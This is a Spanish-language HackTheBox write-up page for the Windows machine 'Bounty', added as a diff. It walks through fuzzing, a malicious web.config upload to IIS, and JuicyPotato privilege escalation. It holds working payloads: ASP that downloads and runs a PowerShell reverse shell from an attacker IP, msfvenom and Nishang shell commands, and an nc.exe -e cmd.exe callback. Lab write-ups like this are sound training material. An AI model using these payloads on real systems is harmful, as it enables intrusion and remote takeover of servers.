@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Bounty HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/bounty/pasted-20260309005421.png" alt="Bounty HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Bounty</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>burpsuite</span>
+            <span>fuzzing_extensiones</span>
+            <span>find</span>
+            <span>microsoft_iis</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing de directorios, extensiones y validación del upload en IIS</li>
+            <li><code>Explotación</code>: Subida de <code>web.config</code> malicioso para ejecutar comandos</li>
+            <li><code>Escalada de Privilegios</code>: <code>SeImpersonatePrivilege</code> mediante JuicyPotato</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración: Web IIS</h2>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309005028.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Fuzzing de directorios</h3>
+            <pre><code>gobuster dir -u http://bounty/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 30
+# uploadedFiles</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309005008.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Fuzzing de extensiones asp y aspx de la web IIS</h3>
+            <pre><code>gobuster dir -u http://bounty/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 30 -x aspx,asp
+# Archivo transfer.aspx</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309005124.png" alt="Bounty HTB" />
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309115956.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Buscar extensiones válidas para el uploadFile: Buscar wordlists de extensiones</h3>
+            <pre><code>find /usr/share/wordlists \-name \*extension\* | xargs wc -l
+# Crear diccionario de extensiones lowercase que empiezan por punto
+cat /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions-lowercase.txt | grep . | sponge extensions.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309131743.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Burpsuite: Sniper Attack</h3>
+            <pre><code># Payload de test.txt: .txt
+# Subir de payload extensions.txt
+# Quitar URL-Encode
+# Añadir GrepExtract para filtar por la respuesta</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309131811.png" alt="Bounty HTB" />
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309132013.png" alt="Bounty HTB" />
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309132125.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Extensiones permitidas</h3>
+            <pre><code># .(multimedia)
+# .(ofimática)
+# .config -&gt; payload con .config</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309132835.png" alt="Bounty HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: IIS upload .config malicioso</h2>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309141418.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Subir web.config: Comprobar si es vulnerable 1+2</h3>
+            <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy="Read, Script, Write"&gt;
+         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceTyp&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=".config" /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment="web.config" /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+&lt;%
+Response.write("-"&amp;"-&gt;")
+' it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write("&lt;!-"&amp;"-")
+%&gt;
+--&gt;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309141818.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>web.config payload reverse shell</h3>
+            <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+
+    &lt;system.webServer&gt;
+        &lt;handlers accessPolicy="Read, Script, Write"&gt;
+            &lt;add 
+                name="web_config"
+                path="*.config"
+                verb="*"
+                modules="IsapiModule"
+                scriptProcessor="%windir%\system32\inetsrv\asp.dll"
+                resourceType="Unspecified"
+                requireAccess="Write"
+                preCondition="bitness64"
+            /&gt;
+        &lt;/handlers&gt;
+
+        &lt;security&gt;
+            &lt;requestFiltering&gt;
+                &lt;fileExtensions&gt;
+                    &lt;remove fileExtension=".config" /&gt;
+                &lt;/fileExtensions&gt;
+
+                &lt;hiddenSegments&gt;
+                    &lt;remove segment="web.config" /&gt;
+                &lt;/hiddenSegments&gt;
+            &lt;/requestFiltering&gt;
+        &lt;/security&gt;
+    &lt;/system.webServer&gt;
+
+    &lt;appSettings&gt;
+    &lt;/appSettings&gt;
+
+&lt;/configuration&gt;
+
+&lt;%
+Set objShell = CreateObject("WScript.Shell")
+
+strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.16.69/reverse shell.ps1')"
+
+Set objShellExec = objShell.Exec(strCommand)
+
+strOutput = objShellExec.StdOut.ReadAll()
+
+WScript.StdOut.Write(strOutput)
+WScript.Echo(strOutput)
+%&gt;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar web.config mientras hosteamos con python la reverse shell y Listener</h3>
+            <pre><code># URL: http://bounty/uploadedFiles/web.config
+# Hostear reverse shell.ps1
+python -m http.server 80
+# Listener
+penelope -443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>reverse shell.ps1</h3>
+            <pre><code># Opción 1: Nishang Invoke-PowerShellTcp.ps1
+cp ../windows_tool/Invoke-PowerShellTcp.ps1 reverse shell.ps1
+# Modificar última línea
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.69 -Port 443
+
+# Opción 2: MSFVenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.69 LPORT=443 -f psh -o reverse shell.ps1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309150644.png" alt="Bounty HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Privilegios</h3>
+            <pre><code>whoami /all</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309150720.png" alt="Bounty HTB" />
+          <div class="code-card">
+            <h3>Juicy Potato</h3>
+            <pre><code>JuicyPotato.exe -l 53375 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\merlin\Desktop\nc.exe 10.10.16.69 4443 -e cmd.exe" -t *</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bounty/pasted-20260309150622.png" alt="Bounty HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>burpsuite</span>
+            <span>fuzzing_extensiones</span>
+            <span>find</span>
+            <span>microsoft_iis</span>
+            <span>impersonación</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
